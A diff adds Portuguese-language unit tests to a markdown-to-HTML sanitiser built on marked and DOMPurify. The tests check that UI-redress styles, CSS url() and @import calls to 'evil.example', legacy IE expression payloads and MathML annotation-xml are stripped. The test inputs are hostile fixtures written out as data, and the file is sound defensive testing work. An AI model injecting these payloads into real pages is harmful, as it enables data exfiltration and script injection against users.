@@ -134,3 +134,65 @@ describe('convert (pipeline marked → DOMPurify)', () => {
     expect(convert('[x](javascript:alert(1))')).not.toContain('href=');
   });
 });
+
+describe('M1 — atributo <style> perigoso', () => {
+  it('remove style com position:fixed (UI redress sobre o editor)', () => {
+    const html = convert('<div style="position:fixed;inset:0;background:#f00">x</div>');
+    expect(html).not.toContain('position:fixed');
+    expect(html).toContain('x');
+  });
+
+  it('remove style com position:sticky', () => {
+    expect(convert('<div style="position: sticky;top:0">x</div>')).not.toContain('position:');
+  });
+
+  it('remove style com url() — exfiltração a cada render', () => {
+    const html = convert('<span style="background:url(https://evil.example/pixel?d=1)">x</span>');
+    expect(html).not.toContain('url(');
+    expect(html).toContain('x');
+  });
+
+  it('remove payloads legados de IE (expression/behavior/-moz-binding)', () => {
+    expect(convert('<div style="width:expression(alert(1))">x</div>')).not.toContain('expression');
+    expect(convert('<div style="behavior:url(#t)">x</div>')).not.toContain('behavior');
+    expect(convert('<div style="-moz-binding:url(x.xml)">x</div>')).not.toContain('-moz-binding');
+  });
+
+  it('mantém style inofensivo (cor, layout e o style inline do KaTeX)', () => {
+    const benign = convert('<span style="color:red;font-weight:bold">x</span>');
+    expect(benign).toContain('style="color:red;font-weight:bold"');
+
+    const katex = convert('<div style="height:0.8em;position:absolute">x</div>');
+    expect(katex).toContain('position:absolute');
+  });
+
+  it('mantém o style do KaTeX nas fórmulas renderizadas', () => {
+    const html = convert('$E=mc^2$');
+    expect(html).toContain('class="katex"');
+    expect(html).toMatch(/<span[^>]*style="/);
+  });
+
+  it('remove <style> mesmo dentro de <svg> (@import executaria no documento)', () => {
+    const html = convert('<svg><style>@import url("https://evil.example/x.css");</style></svg>');
+    expect(html).not.toContain('<style');
+    expect(html).not.toContain('@import');
+  });
+});
+
+describe('MathML — annotation-xml fica de fora', () => {
+  it('mantém <math>/<semantics>/<annotation> escritos no markdown', () => {
+    const html = convert(
+      '<math><semantics><mi>x</mi><annotation encoding="application/x-tex">x</annotation></semantics></math>',
+    );
+    expect(html).toContain('<math>');
+    expect(html).toContain('<annotation');
+  });
+
+  it('remove <annotation-xml encoding="text/html"> (único vetor de XSS da MathML)', () => {
+    const html = convert(
+      '<math><semantics><annotation-xml encoding="text/html"><b>oi</b></annotation-xml></semantics></math>',
+    );
+    expect(html).not.toContain('annotation-xml');
+    expect(html).toContain('<math>');
+  });
+});
